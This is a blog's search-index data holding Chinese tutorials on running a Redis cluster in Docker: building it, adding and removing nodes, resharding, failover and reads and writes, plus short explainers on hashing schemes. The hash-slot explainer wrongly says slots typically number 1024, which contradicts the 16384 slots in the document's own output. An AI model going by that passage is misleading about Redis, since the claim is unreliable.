[{"title":"Redis缩容案例","url":"/2023/08/14/RedisDel/","content":"\n### 操作步骤\n\n要实现Redis缩容，例如移除6387的主机，首先需要把6388的Slave主机移除，然后归还槽位，最后再移除Master主机。\n\n1. 首先查看集群信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n<!-- more -->\n\n效果：\n\n```bash\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[1365-5460] (4096 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[6827-10922] (4096 slots) master\n   1 additional replica(s)\nS: 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 192.168.1.42:6388\n   slots: (0 slots) slave\n   replicates 791172307abf9223425af595e661cec441951170\nM: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387\n   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master\n   1 additional replica(s)\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[12288-16383] (4096 slots) master\n   1 additional replica(s)\n```\n\n2. 移除6388Slave主机\n\n```bash\nredis-cli --cluster del-node 192.168.1.42:6388 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73\n```\n\n效果：\n\n```bash\nroot@knight:/data# redis-cli --cluster del-node 192.168.1.42:6388 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73\n>>> Removing node 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 from cluster 192.168.1.42:6388\n>>> Sending CLUSTER FORGET messages to the cluster...\n>>> Sending CLUSTER RESET SOFT to the deleted node.\n```\n\n3. 再次查看集群的状态信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n效果：\n\n```bash\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[1365-5460] (4096 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[6827-10922] (4096 slots) master\n   1 additional replica(s)\nM: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387\n   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[12288-16383] (4096 slots) master\n   1 additional replica(s)\n```\n\n可以看到只有3个Slave主机了。\n\n4. 重新分配槽号\n\n```bash\nredis-cli --cluster reshard 192.168.1.42:6381\n```\n\n要删除的是6387的Master主机，要把6387拥有的槽号统一分配给6386的Master主机，按照下图的指示进行操作：\n\n![重新分配槽号](./RedisDel/1.png)\n\n5. 稍作等待，待槽号重新分配完成，查看集群节点的槽号信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n效果：\n\n```bash\nroot@knight:/data# redis-cli --cluster check 192.168.1.42:6381\n192.168.1.42:6386 (849a82f0...) -> 0 keys | 8192 slots | 1 slaves.\n192.168.1.42:6382 (6dca8499...) -> 1 keys | 4096 slots | 1 slaves.\n192.168.1.42:6387 (79117230...) -> 0 keys | 0 slots | 0 slaves.\n192.168.1.42:6383 (41f99f51...) -> 1 keys | 4096 slots | 1 slaves.\n```\n\n可以看到6387的主机已经没有任何槽号了，而6386主机比其他两个Master节点多出来4096个槽号。\n\n5. 从集群删除6387节点\n\n```bash\nredis-cli --cluster del-node 192.168.1.42:6387 791172307abf9223425af595e661cec441951170\n```\n\n效果：\n\n```bash\nroot@knight:/data# redis-cli --cluster del-node 192.168.1.42:6387 791172307abf9223425af595e661cec441951170\n>>> Removing node 791172307abf9223425af595e661cec441951170 from cluster 192.168.1.42:6387\n>>> Sending CLUSTER FORGET messages to the cluster...\n>>> Sending CLUSTER RESET SOFT to the deleted node.\n```\n\n6. 再次查看集群节点信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n效果：\n\n```bash\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[0-6826],[10923-12287] (8192 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[6827-10922] (4096 slots) master\n   1 additional replica(s)\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[12288-16383] (4096 slots) master\n   1 additional replica(s)\n```\n\n可以看到集群又恢复到3主3从的节点状态。","tags":["Docker","Redis"],"categories":["技术"]},{"title":"Redis扩容案例","url":"/2023/08/14/RedisAdd/","content":"\n### 操作步骤\n\n1. 新建两个容器\n\n```bash\ndocker run -d --name redis-node-7 --net host --privileged=true -v /docker/redis/share/redis-node-7:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6387\ndocker run -d --name redis-node-8 --net host --privileged=true -v /docker/redis/share/redis-node-8:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6388\n```\n\n<!-- more -->\n\n2. 进入7号容器（新建的容器）\n\n```bash\ndocker exec -it redis-node-7 bash\n```\n\n3. 使7号容器加入集群\n\n```bash\nredis-cli --cluster add-node 192.168.1.42:6387 192.168.1.42:6381\n```\n\n前面写的是本容器的IP:端口，后面跟着是集群领路人的IP:端口。执行后出现如下的提示信息表示成功：\n\n```bash\n>>> Check for open slots...\n>>> Check slots coverage...\n[OK] All 16384 slots covered.\n>>> Send CLUSTER MEET to node 192.168.1.42:6387 to make it join the cluster.\n[OK] New node added correctly.\n```\n\n4. 查看集群的节点信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:8371\n```\n\n效果：\n\n```bash\n192.168.1.42:6386 (849a82f0...) -> 0 keys | 5461 slots | 1 slaves.\n192.168.1.42:6382 (6dca8499...) -> 1 keys | 5462 slots | 1 slaves.\n192.168.1.42:6387 (79117230...) -> 0 keys | 0 slots | 0 slaves.\n192.168.1.42:6383 (41f99f51...) -> 1 keys | 5461 slots | 1 slaves.\n\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[0-5460] (5461 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[5461-10922] (5462 slots) master\n   1 additional replica(s)\nM: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387\n   slots: (0 slots) master\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[10923-16383] (5461 slots) master\n   1 additional replica(s)\n```\n\n从以上的效果可以看到，端口被6387的节点已经成功添加进来，但是并没有像其他的Master主机一样分配到槽位。所以从实际意义上来说，它还不算正式加入集群。\n\n5. 重新分配槽号\n\n```bash\nredis-cli --cluster reshard 192.168.1.42:6381\n```\n\n后面接着的IP还是集群的领路人。\n\n执行后，要求我们输入每台分配多少个槽号，简单计算一下，一共16384个槽号，4台机器分，每台4096个槽号。\n\n然后下面输入新加入的机器的节点ID。\n\n输入all，最后输入yes确认。\n\n```bash\nHow many slots do you want to move (from 1 to 16384)? 4096\nWhat is the receiving node ID? 791172307abf9223425af595e661cec441951170\nPlease enter all the source node IDs.\n  Type 'all' to use all the nodes as source nodes for the hash slots.\n  Type 'done' once you entered all the source nodes IDs.\nSource node #1: all\n```\n\n6. 再次查看集群节点信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n```bash\n192.168.1.42:6386 (849a82f0...) -> 0 keys | 4096 slots | 1 slaves.\n192.168.1.42:6382 (6dca8499...) -> 1 keys | 4096 slots | 1 slaves.\n192.168.1.42:6387 (79117230...) -> 0 keys | 4096 slots | 0 slaves.\n192.168.1.42:6383 (41f99f51...) -> 1 keys | 4096 slots | 1 slaves.\n\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[1365-5460] (4096 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[6827-10922] (4096 slots) master\n   1 additional replica(s)\nM: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387\n   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[12288-16383] (4096 slots) master\n   1 additional replica(s)\n```\n\n从概略信息可以看到4台机器都分配到了槽号，从下面的详细槽号信息，我们可以观察出，新加入的6387机器分配到的槽号是由其他3台主机各匀过来的。\n\n7. 为新加入的Master主机添加Slave主机\n\n```bash\nredis-cli --cluster add-node 192.168.1.42:6388 192.168.1.42:6387 --cluster-slave --cluster-master-id 791172307abf9223425af595e661cec441951170\n```\n\n* 192.168.1.42:6388 Slave主机的IP:端口\n\n* 192.168.1.42:6387 Master主机的IP:端口\n\n* 最后加要挂载的Master主机的节点ID\n\n8. 查看节点信息\n\n```bash\nroot@knight:/data# redis-cli -p 6381\n127.0.0.1:6381> cluster nodes\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692019970307 7 connected 1365-5460\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,slave 849a82f0bd85238762ca7ccf234aa30ba97d93a0 0 1692019967000 7 connected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692019968297 3 connected\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692019965000 2 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1692019968000 2 connected 6827-10922\n8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 192.168.1.42:6388@16388 slave 791172307abf9223425af595e661cec441951170 0 1692019967000 8 connected\n791172307abf9223425af595e661cec441951170 192.168.1.42:6387@16387 master - 0 1692019967293 8 connected 0-1364 5461-6826 10923-12287\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692019970000 3 connected 12288-16383\n127.0.0.1:6381> \n```","tags":["Docker","Redis"],"categories":["技术"]},{"title":"Docker演示Redis集群主从切换案例","url":"/2023/08/14/RedisMasterSlave/","content":"\n### 操作步骤\n\n1. 查看当前的集群情况\n\n```bash\nroot@knight:/data# redis-cli -p 6381 -c\n127.0.0.1:6381> cluster nodes\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1691996146001 3 connected 10923-16383\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 slave f999e35136ec2e61fcceebf182f5c38ef4a4354d 0 1691996144999 1 connected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1691996144000 3 connected\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,master - 0 1691996145000 1 connected 0-5460\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1691996144000 2 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1691996144000 2 connected 5461-10922\n127.0.0.1:6381> \n```\n\n<!-- more -->\n\n当前登录主机为1号机，6号机是1号机的从服务器，5号机是3号机的从服务器，4号机是2号机的从服务器。\n\n2. 关闭1号机容器，然后再次查看容器的状态\n\n关闭1号容器\n\n```bash\ndocker stop redis-node-1\n```\n\n效果：\n\n```bash\nroot@knight:/docker# docker stop redis-node-1\nredis-node-1\nroot@knight:/docker# docker ps -a\nCONTAINER ID   IMAGE         COMMAND                  CREATED        STATUS                     PORTS     NAMES\n61d59245db3d   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-6\n223fad42e069   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-5\nf0055941fe3f   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-4\ne361d9695a0c   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-3\n400119c3015c   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Up 5 hours                           redis-node-2\n61e2e38927c4   redis:6.0.8   \"docker-entrypoint.s…\"   28 hours ago   Exited (0) 9 seconds ago             redis-node-1\n```\n\n可以看到1号容器已经被关掉了。\n\n3. 然后以2号机作为切入点，查看集群的状态。\n\n进入2号容器：\n\n```bash\ndocker exec -it redis-node-2 bash\n```\n\n效果：\n\n```bash\nroot@knight:/docker# docker exec -it redis-node-2 bash\nroot@knight:/data# redis-cli -p 6382 -c\n127.0.0.1:6382> cluster nodes\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692013667508 2 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 myself,master - 0 1692013666000 2 connected 5461-10922\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692013667000 3 connected 10923-16383\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 master,fail - 1692013443386 1692013440000 1 disconnected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692013665000 3 connected\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692013665498 7 connected 0-5460\n127.0.0.1:6382> \n```\n\n可以看到当前6号机处于master状态，顶替了原来1号机的位置，而1号机现在处于fail状态。\n\n这就完成了redis主从切换的演示，补充一句，如果把1号机重新启动回来的话，也不会影响现在6号机的master状态，1号机会作为6号机的slave机器。\n\n效果如下：\n\n```bash\nroot@knight:/docker# docker start redis-node-1 \nredis-node-1\nroot@knight:/docker# docker exec -it redis-node-1 bash\nroot@knight:/data# redis-cli -p 6381 -c\n127.0.0.1:6381> cluster nodes\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 master - 0 1692013947000 7 connected 0-5460\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,slave 849a82f0bd85238762ca7ccf234aa30ba97d93a0 0 1692013947000 7 connected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1692013946019 3 connected\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1692013949036 2 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1692013947022 2 connected 5461-10922\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1692013948030 3 connected 10923-16383\n127.0.0.1:6381> \n```","tags":["Docker","Redis"],"categories":["技术"]},{"title":"Redis集群数据读写演示","url":"/2023/08/13/RedisDataIO/","content":"\n### 数据读写存储\n\n错误演示：\n\n```bash\nroot@knight:/data# redis-cli -p 6381\n127.0.0.1:6381> keys *\n(empty array)\n127.0.0.1:6381> set k1 v1\n(error) MOVED 12706 192.168.1.42:6383\n127.0.0.1:6381> set k2 v2\nOK\n127.0.0.1:6381> set k3 v3\nOK\n127.0.0.1:6381> set k4 v4\n(error) MOVED 8455 192.168.1.42:6382\n127.0.0.1:6381> \n```\n\n<!-- more -->\n\n可以发现使用`redis-cli -p 6381`命令进入单节点的容器，存在部分数据无法存储的情况（k2,k3存储成功，k1,k4存储失败），正确的进入方式应该是进入集群，然后进行数据的存储。\n\n正确演示：\n\n```bash\n127.0.0.1:6381> exit\nroot@knight:/data# redis-cli -p 6381 -c\n127.0.0.1:6381> FLUSHALL\nOK\n127.0.0.1:6381> set k1 v1\n-> Redirected to slot [12706] located at 192.168.1.42:6383\nOK\n192.168.1.42:6383> set k4 v4\n-> Redirected to slot [8455] located at 192.168.1.42:6382\nOK\n192.168.1.42:6382> \n```\n\n退出后重新进入，清空所有的数据，重新插入之前插入失败的数据，可以插入了，并且可以发现之所以可以成功插入数据，是因为系统将数据重定向到了应该插入的机器上（注意端口号的变化）。\n\n","tags":["Docker","Redis"],"categories":["技术"]},{"title":"搭建Redis集群","url":"/2023/08/13/BuildRedis/","content":"\n### 操作步骤\n\n1. 下载镜像\n\n```bash\ndocker pull redis:6.0.8\n```\n\n<!-- more -->\n\n2. 生成容器\n\n```bash\ndocker run -d --name redis-node-1 --net host --privileged=true -v /docker/redis/share/redis-node-1:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6381\ndocker run -d --name redis-node-2 --net host --privileged=true -v /docker/redis/share/redis-node-2:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6382\ndocker run -d --name redis-node-3 --net host --privileged=true -v /docker/redis/share/redis-node-3:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6383\ndocker run -d --name redis-node-4 --net host --privileged=true -v /docker/redis/share/redis-node-4:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6384\ndocker run -d --name redis-node-5 --net host --privileged=true -v /docker/redis/share/redis-node-5:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6385\ndocker run -d --name redis-node-6 --net host --privileged=true -v /docker/redis/share/redis-node-6:/data redis:6.0.8 --cluster-enabled yes --appendonly yes --port 6386\n```\n\n效果展示：\n\n```bash\nroot@knight:/docker# docker ps\nCONTAINER ID   IMAGE         COMMAND                  CREATED              STATUS              PORTS     NAMES\n61d59245db3d   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-6\n223fad42e069   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-5\nf0055941fe3f   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-4\ne361d9695a0c   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-3\n400119c3015c   redis:6.0.8   \"docker-entrypoint.s…\"   About a minute ago   Up About a minute             redis-node-2\n61e2e38927c4   redis:6.0.8   \"docker-entrypoint.s…\"   4 minutes ago        Up 4 minutes                  redis-node-1\n```\n\n3. 构建主从关系\n\n随便进入一台容器，在这里使用1号机进行演示。\n\n* 进入容器\n\n```bash\ndocker exec -it redis-node-1 bash\n```\n\n* 建立集群\n\n```bash\nredis-cli --cluster create 192.168.1.42:6381 192.168.1.42:6382 192.168.1.42:6383 192.168.1.42:6384 192.168.1.42:6385 192.168.1.42:6386 --cluster-replicas 1\n```\n\n--cluster-replicas 1 一个主服务器配置一个从服务器。\n\n之后出现下面这行提示，按要求输入`yes`\n\n```bash\nCan I set the above configuration? (type 'yes' to accept): yes\n```\n\n出现下面的提示代表集群建立完成：\n\n```bash\n[OK] All nodes agree about slots configuration.\n>>> Check for open slots...\n>>> Check slots coverage...\n[OK] All 16384 slots covered.\n```\n\n4. 查看集群信息\n\n```bash\nredis-cli -p 6381\ncluster info\ncluster nodes\n```\n\n效果展示：\n\n```bash\nroot@knight:/data# redis-cli -p 6381\n127.0.0.1:6381> cluster info\ncluster_state:ok\ncluster_slots_assigned:16384\ncluster_slots_ok:16384\ncluster_slots_pfail:0\ncluster_slots_fail:0\ncluster_known_nodes:6\ncluster_size:3\ncluster_current_epoch:6\ncluster_my_epoch:1\ncluster_stats_messages_ping_sent:335\ncluster_stats_messages_pong_sent:315\ncluster_stats_messages_sent:650\ncluster_stats_messages_ping_received:310\ncluster_stats_messages_pong_received:335\ncluster_stats_messages_meet_received:5\ncluster_stats_messages_received:650\n\n127.0.0.1:6381> cluster nodes\n41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383@16383 master - 0 1691914813226 3 connected 10923-16383\n849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386@16386 slave f999e35136ec2e61fcceebf182f5c38ef4a4354d 0 1691914812223 1 connected\n6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382@16382 master - 0 1691914811000 2 connected 5461-10922\n8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384@16384 slave 6dca84998e245ce4cc6c92882fb7ac94d501efda 0 1691914812000 2 connected\n9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385@16385 slave 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 0 1691914812000 3 connected\nf999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381@16381 myself,master - 0 1691914809000 1 connected 0-5460\n127.0.0.1:6381> \n```\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n换成自己主机的IP，端口号随便是集群的任何一个容器的都可以。\n\n效果展示：\n\n```bash\nroot@knight:/data# redis-cli --cluster check 192.168.1.42:6381\n192.168.1.42:6381 (f999e351...) -> 0 keys | 5461 slots | 1 slaves.\n192.168.1.42:6383 (41f99f51...) -> 1 keys | 5461 slots | 1 slaves.\n192.168.1.42:6382 (6dca8499...) -> 1 keys | 5462 slots | 1 slaves.\n[OK] 2 keys in 3 masters.\n0.00 keys per slot on average.\n>>> Performing Cluster Check (using node 192.168.1.42:6381)\nM: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots:[0-5460] (5461 slots) master\n   1 additional replica(s)\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[10923-16383] (5461 slots) master\n   1 additional replica(s)\nS: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots: (0 slots) slave\n   replicates f999e35136ec2e61fcceebf182f5c38ef4a4354d\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[5461-10922] (5462 slots) master\n   1 additional replica(s)\n[OK] All nodes agree about slots configuration.\n>>> Check for open slots...\n>>> Check slots coverage...\n[OK] All 16384 slots covered.\nroot@knight:/data# \n```","tags":["Docker","Redis"],"categories":["技术"]},{"title":"分布式存储之哈希槽算法","url":"/2023/08/13/HasSlot/","content":"\n### 基本思想\n\n哈希槽(Hash Slot)算法是Redis集群实现分布式存储的核心算法。其基本思路是:\n\n1. 将整个键空间(0-2^16-1)划分为固定数目(比如1024)的槽(slot)。 \n\n2. 根据键值的哈希值对槽数取模,计算该键应该映射到哪个槽。\n\n<!-- more -->\n\n3. 将槽均匀分配给不同的节点。\n\n4. 节点只负责处理映射到自己槽位上的键值操作。\n\n例如,节点A负责0-511槽,节点B负责512-1023槽。\n\n对键值foo计算哈希值,如果余数为100,则该键值属于第100个槽,由节点A处理。\n\n这种方式可将大量键值均匀地分布在不同节点上,实现扩展。\n\n增加节点时,可以平移部分槽到新节点,不需要重定向键值,方便扩容。\n\n相比一致性哈希,哈希槽算法实现更简单,数据分布更均匀,是Redis集群首选的分布式存储算法。\n\n### 缺点\n\n哈希槽算法虽是目前最好的解决方案，但是也并不是最完美的，主要存在一下几个缺点：\n\n1. 键空间分片粒度大\n\n哈希槽算法将整个键空间划分为固定数目的槽,典型的槽位数是1024个。这导致单个槽所能存储的键值上限很大,分片粒度较粗。\n\n2. 热点键问题\n\n由于哈希冲突,可能有大量访问热点的键值都映射到同一个槽,导致访问压力集中在单个节点。\n\n3. 不均衡\n\n随着时间推移,不同槽所存储的键值数量可能出现不平衡,导致不同节点负载不均。\n\n4. 节点扩容缩容代价大\n\n扩容时需要平移部分槽到新节点;缩容时需要复制槽内数据到其他节点。数据量大时代价高。\n\n5. 只适合键值型数据库\n\n哈希槽算法依赖键值哈希映射,不适合用于关系型数据库等其他数据类型。\n\n总体来说,这些缺点限制了哈希槽算法在更大规模和更复杂场景下的适用性。需要与其他技术相结合来获取更好的分布式效果。","tags":["Docker","Redis"],"categories":["理论知识"]},{"title":"分布式存储之一致性哈希算法","url":"/2023/08/13/ConsistencyHashing/","content":"\n### 基本思想\n\n一致性哈希算法(Consistency Hashing)是一种分布式存储算法,通过哈希环实现数据的均衡分布和高可用。主要特点是:\n\n1. 数据映射到一个0到2^32的哈希环上。\n\n2. 节点也映射到这个哈希环上。\n\n<!-- more -->\n\n3. 每个数据通过哈希函数确定一个位置,定位到其顺时针方向第一台服务器节点上。\n\n4. 当新增或删除节点时,只影响相邻数据,大部分数据位置不变。\n\n比如节点A映射到哈希环的30位置,节点B映射到70位置。数据X映射到40位置,按顺时针方向找到节点A,所以存储到A上。\n\n如果新增节点C映射到50位置,只会影响40-50区间数据,其它数据位置不变,实现了高可用。\n\n相比哈希取余,一致性哈希算法只需要重定位部分数据,大大减少了扩容缩容的影响。\n\n它的缺点是数据分布不够均匀,容易造成数据倾斜。常见优化是引入虚拟节点来纾解热点问题。\n\n拓展资料：[简单介绍：一致性HASH算法和取余算法](https://blog.51cto.com/u_12740336/6173086)","tags":["Docker","Redis"],"categories":["理论知识"]},{"title":"分布式存储之哈希取余算法","url":"/2023/08/13/HashRemainder/","content":"\n### 基本思想\n\n哈希取余算法是一种简单的分布式存储算法,基本思想是:\n\n1. 对存储数据计算哈希值(hash)\n\n2. 对存储节点数量取余,得到一个索引值\n\n<!-- more -->\n\n3. 根据索引值将数据存储到对应的存储节点上\n\n例如,有存储数据A,B,C,总共3个存储节点(节点号0,1,2)\n\n1. 计算A的哈希值hash(A) = 7 \n\n2. 7 % 3 = 1,所以存储到节点1\n\n3. 计算B的哈希值hash(B) = 11\n\n4. 11 % 3 = 2,所以存储到节点2\n\n5. 计算C的哈希值hash(C) = 5\n\n6. 5 % 3 = 2,所以也存储到节点2\n\n通过这个算法,可以将数据均匀地分布到不同的存储节点上,实现负载均衡。\n\n这种算法的优点是简单易实现,计算速度快,缺点是扩容或节点变更时需要重定位大量数据,也无法防止数据热点问题。\n\n所以哈希取余算法适用于小规模、低变更频率的分布式存储场景。在大数据量或高变更频率场景下,会采用一致性哈希等更高效的算法。","tags":["Docker","Redis"],"categories":["理论知识"]},{"title":"Docker实现MySQL主从复制","url":"/2023/08/12/DockerMySQLMasterSlave/","content":"\n### 操作步骤\n\n1. 下载镜像\n\n```bash\ndocker pull mysql:5.7\n```\n\n目前我测试最新的8.0.27是不能测试成功的，不知道原因出在哪里，保守一点使用5.7的版本。\n\n<!-- more 